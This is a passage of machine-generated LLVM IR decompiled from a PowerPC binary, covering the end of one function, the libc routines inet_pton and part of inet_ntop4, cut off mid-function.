  store i32 ptrtoint ([3 x i8]* @global_var_10009d1c.469 to i32), i32* @lr, align 4
  %v0_10009d18 = call i32 @memcpy()
  br label %dec_label_pc_10009d28

dec_label_pc_10009d28:                            ; preds = %dec_label_pc_10009ccc, %dec_label_pc_10009c98, %dec_label_pc_10009cb8, %dec_label_pc_10009d04, %dec_label_pc_10009d0c
  %storemerge = phi i32 [ 1, %dec_label_pc_10009d0c ], [ 0, %dec_label_pc_10009d04 ], [ 0, %dec_label_pc_10009cb8 ], [ 0, %dec_label_pc_10009c98 ], [ 0, %dec_label_pc_10009ccc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_10009d38 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009c68)
  %v4_10009d38 = extractvalue %0 %v1_10009d38, 2
  store i1 %v4_10009d38, i1* %cr0_eq.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10009cf0, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10009ce4, { 2, 1, 0 }
  uselistorder i32 %v0_10009c68, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009d28, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10009ce0.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10009d44 = load i32, i32* @lr, align 4
  store i32 %v0_10009d44, i32* %r0.global-to-local, align 4
  %v3_10009d48 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10009d48, label %dec_label_pc_10009d6c, label %dec_label_pc_10009d60

dec_label_pc_10009d60:                            ; preds = %entry
  %v3_10009d60 = icmp eq i32 %arg1, 10
  br i1 %v3_10009d60, label %dec_label_pc_10009d80, label %dec_label_pc_10009f1c

dec_label_pc_10009d6c:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268475768, i32* @lr, align 4
  %v3_10009d74 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10009d74, i32* %r3.global-to-local, align 4
  store i32 %v3_10009d74, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f34

dec_label_pc_10009d80:                            ; preds = %dec_label_pc_10009d60
  %v2_10009d80 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10009d80, i32* %r3.global-to-local, align 4
  store i32 268475792, i32* @lr, align 4
  %v3_10009d8c = call i32 @__GI_memset(i32 %v2_10009d80, i32 0, i32 16)
  store i32 %v3_10009d8c, i32* %r3.global-to-local, align 4
  %v0_10009d90 = load i32, i32* @r29, align 4
  %v1_10009d90 = inttoptr i32 %v0_10009d90 to i8*
  %v2_10009d90 = load i8, i8* %v1_10009d90, align 1
  %v3_10009d90 = zext i8 %v2_10009d90 to i32
  store i32 %v3_10009d90, i32* %r0.global-to-local, align 4
  store i32 %v3_10009d8c, i32* @r31, align 4
  %v2_10009d98 = add i32 %v3_10009d8c, 16
  store i32 %v2_10009d98, i32* @r27, align 4
  %v3_10009d9c = icmp eq i8 %v2_10009d90, 58
  br i1 %v3_10009d9c, label %dec_label_pc_10009da4, label %dec_label_pc_10009db0

dec_label_pc_10009da4:                            ; preds = %dec_label_pc_10009d80
  %v1_10009da4 = add i32 %v0_10009d90, 1
  %v2_10009da4 = inttoptr i32 %v1_10009da4 to i8*
  %v3_10009da4 = load i8, i8* %v2_10009da4, align 1
  %v4_10009da4 = zext i8 %v3_10009da4 to i32
  store i32 %v4_10009da4, i32* %r0.global-to-local, align 4
  store i32 %v1_10009da4, i32* @r29, align 4
  %v3_10009da8 = icmp eq i8 %v3_10009da4, 58
  br i1 %v3_10009da8, label %dec_label_pc_10009db0, label %dec_label_pc_10009f30

dec_label_pc_10009db0:                            ; preds = %dec_label_pc_10009da4, %dec_label_pc_10009d80
  %v0_10009db0 = phi i32 [ %v1_10009da4, %dec_label_pc_10009da4 ], [ %v0_10009d90, %dec_label_pc_10009d80 ]
  store i32 %v0_10009db0, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10009e843036 = inttoptr i32 %v0_10009db0 to i8*
  %v2_10009e843137 = load i8, i8* %v1_10009e843036, align 1
  %v3_10009e843238 = zext i8 %v2_10009e843137 to i32
  store i32 %v3_10009e843238, i32* %r3.global-to-local, align 4
  store i32 268476044, i32* @lr, align 4
  %v1_10009e883339 = call i32 @__GI_tolower(i32 %v3_10009e843238)
  store i32 %v1_10009e883339, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e883339, i32* @r30, align 4
  %v3_10009e8c3440 = icmp eq i32 %v1_10009e883339, 0
  br i1 %v3_10009e8c3440, label %dec_label_pc_10009e94, label %dec_label_pc_10009dbc.lr.ph

dec_label_pc_10009dbc:                            ; preds = %dec_label_pc_10009dbc.lr.ph, %dec_label_pc_10009e84.backedge
  %v1_10009e8835 = phi i32 [ %v1_10009e883341, %dec_label_pc_10009dbc.lr.ph ], [ %v1_10009e88, %dec_label_pc_10009e84.backedge ]
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000d018.470 to i32), i32* @r25, align 4
  %v0_10009dc8 = load i32, i32* @r29, align 4
  %v1_10009dc8 = add i32 %v0_10009dc8, 1
  store i32 %v1_10009dc8, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000d018.470 to i32), i32* @r3, align 4
  store i32 268475860, i32* @lr, align 4
  %v3_10009dd0 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1000d018.470 to i32), i32 %v1_10009e8835)
  store i32 %v3_10009dd0, i32* %r3.global-to-local, align 4
  %v3_10009dd4 = icmp eq i32 %v3_10009dd0, 0
  br i1 %v3_10009dd4, label %dec_label_pc_10009df4, label %dec_label_pc_10009ddc

dec_label_pc_10009ddc:                            ; preds = %dec_label_pc_10009dbc
  %v0_10009ddc = load i32, i32* @r25, align 4
  %v2_10009ddc = sub i32 %v3_10009dd0, %v0_10009ddc
  store i32 %v2_10009ddc, i32* %r0.global-to-local, align 4
  %v0_10009de0 = load i32, i32* @r28, align 4
  %v1_10009de0 = mul i32 %v0_10009de0, 16
  store i32 %v1_10009de0, i32* %r9.global-to-local, align 4
  %v2_10009de4 = or i32 %v1_10009de0, %v2_10009ddc
  store i32 %v2_10009de4, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10009de4, 65536
  br i1 %tmp19, label %dec_label_pc_10009e80, label %dec_label_pc_10009f30

dec_label_pc_10009df4:                            ; preds = %dec_label_pc_10009dbc
  %v0_10009df4 = load i32, i32* @r30, align 4
  %v3_10009df4 = icmp eq i32 %v0_10009df4, 58
  br i1 %v3_10009df4, label %dec_label_pc_10009dfc, label %dec_label_pc_10009e50

dec_label_pc_10009dfc:                            ; preds = %dec_label_pc_10009df4
  %v0_10009dfc = load i32, i32* @r23, align 4
  %v3_10009dfc = icmp eq i32 %v0_10009dfc, 0
  br i1 %v3_10009dfc, label %dec_label_pc_10009e04, label %dec_label_pc_10009e18

dec_label_pc_10009e04:                            ; preds = %dec_label_pc_10009dfc
  %v0_10009e04 = load i32, i32* @r24, align 4
  %v3_10009e04 = icmp eq i32 %v0_10009e04, 0
  br i1 %v3_10009e04, label %dec_label_pc_10009e0c, label %dec_label_pc_10009f30

dec_label_pc_10009e0c:                            ; preds = %dec_label_pc_10009e04
  %v0_10009e0c = load i32, i32* @r31, align 4
  store i32 %v0_10009e0c, i32* @r24, align 4
  %v0_10009e10 = load i32, i32* @r29, align 4
  store i32 %v0_10009e10, i32* @r26, align 4
  br label %dec_label_pc_10009e84.backedge

dec_label_pc_10009e18:                            ; preds = %dec_label_pc_10009dfc
  %v0_10009e18 = load i32, i32* @r29, align 4
  %v1_10009e18 = inttoptr i32 %v0_10009e18 to i8*
  %v2_10009e18 = load i8, i8* %v1_10009e18, align 1
  %v3_10009e18 = zext i8 %v2_10009e18 to i32
  store i32 %v3_10009e18, i32* %r0.global-to-local, align 4
  %v3_10009e1c = icmp eq i8 %v2_10009e18, 0
  br i1 %v3_10009e1c, label %dec_label_pc_10009f30, label %dec_label_pc_10009e24

dec_label_pc_10009e24:                            ; preds = %dec_label_pc_10009e18
  %v0_10009e24 = load i32, i32* @r31, align 4
  %v1_10009e24 = add i32 %v0_10009e24, 2
  store i32 %v1_10009e24, i32* %r0.global-to-local, align 4
  %v1_10009e28 = load i32, i32* @r27, align 4
  %v3_10009e28 = icmp ugt i32 %v1_10009e24, %v1_10009e28
  br i1 %v3_10009e28, label %dec_label_pc_10009f30, label %dec_label_pc_10009e30

dec_label_pc_10009e30:                            ; preds = %dec_label_pc_10009e24
  %v0_10009e30 = load i32, i32* @r28, align 4
  %v1_10009e30 = udiv i32 %v0_10009e30, 256
  store i32 %v1_10009e30, i32* %r0.global-to-local, align 4
  %v1_10009e34 = trunc i32 %v0_10009e30 to i8
  %v3_10009e34 = add i32 %v0_10009e24, 1
  %v4_10009e34 = inttoptr i32 %v3_10009e34 to i8*
  store i8 %v1_10009e34, i8* %v4_10009e34, align 1
  %v0_10009e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009e38 = trunc i32 %v0_10009e38 to i8
  %v2_10009e38 = load i32, i32* @r31, align 4
  %v3_10009e38 = inttoptr i32 %v2_10009e38 to i8*
  store i8 %v1_10009e38, i8* %v3_10009e38, align 1
  %v0_10009e3c = load i32, i32* @r29, align 4
  store i32 %v0_10009e3c, i32* @r26, align 4
  %v0_10009e40 = load i32, i32* @r31, align 4
  %v1_10009e40 = add i32 %v0_10009e40, 2
  store i32 %v1_10009e40, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10009e8430 = inttoptr i32 %v0_10009e3c to i8*
  %v2_10009e8431 = load i8, i8* %v1_10009e8430, align 1
  %v3_10009e8432 = zext i8 %v2_10009e8431 to i32
  store i32 %v3_10009e8432, i32* %r3.global-to-local, align 4
  store i32 268476044, i32* @lr, align 4
  %v1_10009e8833 = call i32 @__GI_tolower(i32 %v3_10009e8432)
  store i32 %v1_10009e8833, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e8833, i32* @r30, align 4
  %v3_10009e8c34 = icmp eq i32 %v1_10009e8833, 0
  br i1 %v3_10009e8c34, label %dec_label_pc_10009e94, label %dec_label_pc_10009dbc.lr.ph

dec_label_pc_10009dbc.lr.ph:                      ; preds = %dec_label_pc_10009db0, %dec_label_pc_10009e30
  %v1_10009e883341 = phi i32 [ %v1_10009e8833, %dec_label_pc_10009e30 ], [ %v1_10009e883339, %dec_label_pc_10009db0 ]
  br label %dec_label_pc_10009dbc

dec_label_pc_10009e50:                            ; preds = %dec_label_pc_10009df4
  %v3_10009e50 = icmp eq i32 %v0_10009df4, 46
  br i1 %v3_10009e50, label %dec_label_pc_10009e58, label %dec_label_pc_10009f30

dec_label_pc_10009e58:                            ; preds = %dec_label_pc_10009e50
  %v0_10009e58 = load i32, i32* @r31, align 4
  %v1_10009e58 = add i32 %v0_10009e58, 4
  store i32 %v1_10009e58, i32* @r30, align 4
  %v1_10009e5c = load i32, i32* @r27, align 4
  %v3_10009e5c = icmp ugt i32 %v1_10009e58, %v1_10009e5c
  br i1 %v3_10009e5c, label %dec_label_pc_10009f30, label %dec_label_pc_10009e64

dec_label_pc_10009e64:                            ; preds = %dec_label_pc_10009e58
  %v0_10009e68 = load i32, i32* @r26, align 4
  store i32 %v0_10009e68, i32* %r3.global-to-local, align 4
  store i32 268476016, i32* @lr, align 4
  %v3_10009e6c = call i32 @inet_pton4(i32 %v0_10009e68, i32 %v0_10009e58)
  store i32 %v3_10009e6c, i32* %r3.global-to-local, align 4
  %v0_10009e70 = load i32, i32* @r30, align 4
  store i32 %v0_10009e70, i32* @r31, align 4
  %v2_10009e74 = icmp sgt i32 %v3_10009e6c, 0
  br i1 %v2_10009e74, label %dec_label_pc_10009eb8, label %dec_label_pc_10009f30

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009ddc
  store i32 1, i32* @r23, align 4
  %v0_10009e84.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009e84.backedge

dec_label_pc_10009e84.backedge:                   ; preds = %dec_label_pc_10009e80, %dec_label_pc_10009e0c
  %v0_10009e84.be = phi i32 [ %v0_10009e84.pre.pre, %dec_label_pc_10009e80 ], [ %v0_10009e10, %dec_label_pc_10009e0c ]
  %v1_10009e84 = inttoptr i32 %v0_10009e84.be to i8*
  %v2_10009e84 = load i8, i8* %v1_10009e84, align 1
  %v3_10009e84 = zext i8 %v2_10009e84 to i32
  store i32 %v3_10009e84, i32* %r3.global-to-local, align 4
  store i32 268476044, i32* @lr, align 4
  %v1_10009e88 = call i32 @__GI_tolower(i32 %v3_10009e84)
  store i32 %v1_10009e88, i32* %r3.global-to-local, align 4
  store i32 %v1_10009e88, i32* @r30, align 4
  %v3_10009e8c = icmp eq i32 %v1_10009e88, 0
  br i1 %v3_10009e8c, label %dec_label_pc_10009e94, label %dec_label_pc_10009dbc

dec_label_pc_10009e94:                            ; preds = %dec_label_pc_10009e84.backedge, %dec_label_pc_10009db0, %dec_label_pc_10009e30
  %v0_10009e94 = load i32, i32* @r23, align 4
  %v3_10009e94 = icmp eq i32 %v0_10009e94, 0
  %v0_10009efc.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10009e94, label %dec_label_pc_10009eb8, label %dec_label_pc_10009e9c

dec_label_pc_10009e9c:                            ; preds = %dec_label_pc_10009e94
  %v1_10009e9c = add i32 %v0_10009efc.pre.pre, 2
  store i32 %v1_10009e9c, i32* %r0.global-to-local, align 4
  %v1_10009ea0 = load i32, i32* @r27, align 4
  %v3_10009ea0 = icmp ugt i32 %v1_10009e9c, %v1_10009ea0
  br i1 %v3_10009ea0, label %dec_label_pc_10009f30, label %dec_label_pc_10009ea8

dec_label_pc_10009ea8:                            ; preds = %dec_label_pc_10009e9c
  %v0_10009ea8 = load i32, i32* @r28, align 4
  %v1_10009ea8 = udiv i32 %v0_10009ea8, 256
  store i32 %v1_10009ea8, i32* %r0.global-to-local, align 4
  %v1_10009eac = trunc i32 %v0_10009ea8 to i8
  %v3_10009eac = add i32 %v0_10009efc.pre.pre, 1
  %v4_10009eac = inttoptr i32 %v3_10009eac to i8*
  store i8 %v1_10009eac, i8* %v4_10009eac, align 1
  %v0_10009eb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009eb0 = trunc i32 %v0_10009eb0 to i8
  %v2_10009eb0 = load i32, i32* @r31, align 4
  %v3_10009eb0 = inttoptr i32 %v2_10009eb0 to i8*
  store i8 %v1_10009eb0, i8* %v3_10009eb0, align 1
  %v0_10009eb4 = load i32, i32* @r31, align 4
  %v1_10009eb4 = add i32 %v0_10009eb4, 2
  store i32 %v1_10009eb4, i32* @r31, align 4
  br label %dec_label_pc_10009eb8

dec_label_pc_10009eb8:                            ; preds = %dec_label_pc_10009e94, %dec_label_pc_10009e64, %dec_label_pc_10009ea8
  %v0_10009efc.pre = phi i32 [ %v0_10009e70, %dec_label_pc_10009e64 ], [ %v1_10009eb4, %dec_label_pc_10009ea8 ], [ %v0_10009efc.pre.pre, %dec_label_pc_10009e94 ]
  %v0_10009eb8 = load i32, i32* @r24, align 4
  %v3_10009eb8 = icmp eq i32 %v0_10009eb8, 0
  %v1_10009efc.pre = load i32, i32* @r27, align 4
  %v4_10009efc = icmp eq i32 %v0_10009efc.pre, %v1_10009efc.pre
  br i1 %v3_10009eb8, label %dec_label_pc_10009efc, label %dec_label_pc_10009ec0

dec_label_pc_10009ec0:                            ; preds = %dec_label_pc_10009eb8
  %v2_10009ec4 = sub i32 %v0_10009efc.pre, %v0_10009eb8
  store i32 %v2_10009ec4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10009efc, label %dec_label_pc_10009f30, label %dec_label_pc_10009ee4.preheader

dec_label_pc_10009ee4.preheader:                  ; preds = %dec_label_pc_10009ec0
  %v3_10009ee424 = icmp slt i32 %v2_10009ec4, 1
  %v2_10009ee826 = add i32 %v2_10009ec4, -1
  store i32 %v2_10009ee826, i32* %r11.global-to-local, align 4
  %v2_10009eec27 = add i32 %v1_10009efc.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_10009ee424, label %dec_label_pc_10009efc.thread, label %dec_label_pc_10009ed8

dec_label_pc_10009ed8:                            ; preds = %dec_label_pc_10009ee4.preheader, %dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge
  %v0_10009ed8 = phi i32 [ %v0_10009ed8.pre, %dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge ], [ %v0_10009eb8, %dec_label_pc_10009ee4.preheader ]
  %v2_10009eec29 = phi i32 [ %v2_10009eec, %dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge ], [ %v2_10009eec27, %dec_label_pc_10009ee4.preheader ]
  %v2_10009ee828 = phi i32 [ %v2_10009ee8, %dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge ], [ %v2_10009ee826, %dec_label_pc_10009ee4.preheader ]
  %v2_10009ed8 = add i32 %v0_10009ed8, %v2_10009ee828
  %v3_10009ed8 = inttoptr i32 %v2_10009ed8 to i8*
  %v4_10009ed8 = load i8, i8* %v3_10009ed8, align 1
  %v5_10009ed8 = zext i8 %v4_10009ed8 to i32
  store i32 %v5_10009ed8, i32* %r0.global-to-local, align 4
  %v3_10009edc = inttoptr i32 %v2_10009eec29 to i8*
  store i8 %v4_10009ed8, i8* %v3_10009edc, align 1
  %v0_10009ee0 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009ee0 = load i32, i32* @r24, align 4
  %v2_10009ee0 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009ee0 = trunc i32 %v0_10009ee0 to i8
  %v4_10009ee0 = add i32 %v2_10009ee0, %v1_10009ee0
  %v5_10009ee0 = inttoptr i32 %v4_10009ee0 to i8*
  store i8 %v3_10009ee0, i8* %v5_10009ee0, align 1
  %v0_10009ee4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10009ee4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10009eec.pre = load i32, i32* @r27, align 4
  %v3_10009ee4 = icmp slt i32 %v1_10009ee4.pre, %v0_10009ee4.pre
  %v2_10009ee8 = sub i32 %v1_10009ee4.pre, %v0_10009ee4.pre
  store i32 %v2_10009ee8, i32* %r11.global-to-local, align 4
  %v1_10009ef0 = add i32 %v0_10009ee4.pre, 1
  store i32 %v1_10009ef0, i32* %r9.global-to-local, align 4
  br i1 %v3_10009ee4, label %dec_label_pc_10009efc.thread, label %dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge

dec_label_pc_10009ed8.dec_label_pc_10009ed8_crit_edge: ; preds = %dec_label_pc_10009ed8
  %v2_10009eec = sub i32 %v1_10009eec.pre, %v0_10009ee4.pre
  %v0_10009ed8.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10009ed8

dec_label_pc_10009efc.thread:                     ; preds = %dec_label_pc_10009ed8, %dec_label_pc_10009ee4.preheader
  %v0_10009ef8.lcssa = phi i32 [ %v1_10009efc.pre, %dec_label_pc_10009ee4.preheader ], [ %v1_10009eec.pre, %dec_label_pc_10009ed8 ]
  store i32 %v0_10009ef8.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10009f04

dec_label_pc_10009efc:                            ; preds = %dec_label_pc_10009eb8
  br i1 %v4_10009efc, label %dec_label_pc_10009f04, label %dec_label_pc_10009f30

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009efc.thread, %dec_label_pc_10009efc
  %v0_10009f04 = load i32, i32* @r22, align 4
  store i32 %v0_10009f04, i32* @r3, align 4
  store i32 %v2_10009d80, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009f14.471 to i32), i32* @lr, align 4
  %v0_10009f10 = call i32 @memcpy()
  store i32 %v0_10009f10, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f34

dec_label_pc_10009f1c:                            ; preds = %dec_label_pc_10009d60
  %v0_10009f1c = call i32 @__errno_location()
  store i32 %v0_10009f1c, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10009f28 = inttoptr i32 %v0_10009f1c to i32*
  store i32 97, i32* %v2_10009f28, align 4
  %v0_10009f38.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f34

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009e24, %dec_label_pc_10009e18, %dec_label_pc_10009ddc, %dec_label_pc_10009e04, %dec_label_pc_10009ec0, %dec_label_pc_10009e64, %dec_label_pc_10009e50, %dec_label_pc_10009efc, %dec_label_pc_10009da4, %dec_label_pc_10009e9c, %dec_label_pc_10009e58
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f34

dec_label_pc_10009f34:                            ; preds = %dec_label_pc_10009f1c, %dec_label_pc_10009f04, %dec_label_pc_10009d6c, %dec_label_pc_10009f30
  %v0_10009f38 = phi i32 [ %v0_10009f38.pre, %dec_label_pc_10009f1c ], [ 1, %dec_label_pc_10009f04 ], [ %v3_10009d74, %dec_label_pc_10009d6c ], [ 0, %dec_label_pc_10009f30 ]
  store i32 %v0_10009d44, i32* %r0.global-to-local, align 4
  store i32 %v0_10009f38, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009f38

; uselistorder directives
  uselistorder i32 %v0_10009f38, { 1, 0 }
  uselistorder i32 %v2_10009ee8, { 1, 0 }
  uselistorder i32 %v0_10009ee4.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10009efc, { 1, 0 }
  uselistorder i32 %v0_10009efc.pre, { 1, 0 }
  uselistorder i32 %v0_10009ea8, { 1, 0 }
  uselistorder i32 %v0_10009efc.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10009e88, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10009e30, { 1, 0 }
  uselistorder i32 %v1_10009de0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268476044, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10009f34, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009f30, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10009f04, { 1, 0 }
  uselistorder label %dec_label_pc_10009ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10009eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009e94, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009dbc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10009dbc, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10009fa4.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10009f50 = load i32, i32* @lr, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10009f74 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10009f74, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10009f88.474 to i32), i32* @lr, align 4
  %v3_10009f84 = call i32 @__GI_memset(i32 %v2_10009f74, i32 0, i32 15)
  store i32 %v3_10009f84, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000a0482 = load i32, i32* @r1, align 4
  store i32 %v0_1000a0482, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009fa4

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge, %dec_label_pc_10009fa4.lr.ph
  %v2_10009fc4 = phi i32 [ %v2_1000a048, %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge ], [ %v0_1000a0482, %dec_label_pc_10009fa4.lr.ph ]
  %v0_10009fb4 = phi i32 [ %v0_1000a048, %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge ], [ %v0_1000a0482, %dec_label_pc_10009fa4.lr.ph ]
  %v0_10009fa8 = phi i32 [ %v1_1000a048, %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge ], [ 0, %dec_label_pc_10009fa4.lr.ph ]
  %v1_10009fb0 = phi i32 [ %v1_10009fa4.pre, %dec_label_pc_1000a018.dec_label_pc_10009fa4_crit_edge ], [ 0, %dec_label_pc_10009fa4.lr.ph ]
  %v0_10009fa4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009fa4 = add i32 %v0_10009fa4, %v1_10009fb0
  %v3_10009fa4 = inttoptr i32 %v2_10009fa4 to i8*
  %v4_10009fa4 = load i8, i8* %v3_10009fa4, align 1
  %v5_10009fa4 = zext i8 %v4_10009fa4 to i32
  store i32 %v5_10009fa4, i32* %r10.global-to-local, align 4
  store i32 %v0_10009fa8, i32* %r8.global-to-local, align 4
  %v1_10009fac = add i32 %v0_10009fa8, 1
  store i32 %v1_10009fac, i32* %r11.global-to-local, align 4
  store i32 %v2_10009fa4, i32* %r3.global-to-local, align 4
  %v2_10009fb4 = add i32 %v1_10009fac, %v0_10009fb4
  store i32 %v2_10009fb4, i32* %r6.global-to-local, align 4
  %v1_10009fb8 = load i32, i32* @r28, align 4
  %v2_10009fb8 = udiv i32 %v5_10009fa4, %v1_10009fb8
  %v1_10009fbc = add nuw nsw i32 %v2_10009fb8, 48
  %v1_10009fc0 = urem i32 %v1_10009fbc, 256
  store i32 %v1_10009fc0, i32* %r0.global-to-local, align 4
  %v1_10009fc4 = trunc i32 %v1_10009fbc to i8
  %v3_10009fc4 = add i32 %v2_10009fc4, 8
  %v4_10009fc4 = inttoptr i32 %v3_10009fc4 to i8*
  store i8 %v1_10009fc4, i8* %v4_10009fc4, align 1
  %v0_10009fc8 = load i32, i32* %r0.global-to-local, align 4
  %v3_10009fc8 = icmp eq i32 %v0_10009fc8, 48
  %v0_10009fd0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009fd0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009fd0 = udiv i32 %v0_10009fd0, %v1_10009fd0
  store i32 %v2_10009fd0, i32* %r9.global-to-local, align 4
  br i1 %v3_10009fc8, label %dec_label_pc_10009fd0, label %dec_label_pc_10009ffc

dec_label_pc_10009fd0:                            ; preds = %dec_label_pc_10009fa4
  %v2_10009fd4 = udiv i32 %v2_10009fd0, %v1_10009fd0
  %tmp18 = mul i32 %v2_10009fd4, -10
  %v2_10009fdc = add i32 %v2_10009fd0, 48
  %v1_10009fe0 = add i32 %v2_10009fdc, %tmp18
  store i32 %v1_10009fe0, i32* %r9.global-to-local, align 4
  %v1_10009fe4 = urem i32 %v1_10009fe0, 256
  store i32 %v1_10009fe4, i32* %r0.global-to-local, align 4
  %v1_10009fe8 = trunc i32 %v1_10009fe0 to i8
